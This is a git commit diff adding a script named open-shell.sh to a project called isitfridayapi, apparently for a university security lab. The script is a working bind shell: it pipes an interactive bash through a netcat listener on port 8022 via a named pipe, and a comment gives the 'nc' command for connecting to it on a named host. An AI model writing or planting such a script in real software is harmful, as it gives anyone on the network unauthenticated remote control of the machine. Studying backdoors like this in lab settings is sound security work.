4a4528b7667322b6b48316ace56344facfbd7630
Andreas Kongstad <90042173+Akongstad@users.noreply.github.com>
2022-11-16 12:37:37 +0100

    Update open-shell.sh

--- isitfridayapi/util/open-shell.sh
+++ isitfridayapi/util/open-shell.sh
@@ -1,1 +1,9 @@
+#!/bin/sh
 
+# Opens a TCP listener on port 8022.
+# Connect to it using 'nc secu39.itu.dk 8022' to access the shell
+
+trap "rm -f ~/shell" EXIT
+
+mkfifo ~/shell
+cat ~/shell | bash -i 2>&1 | nc -l 8022 > ~/shell
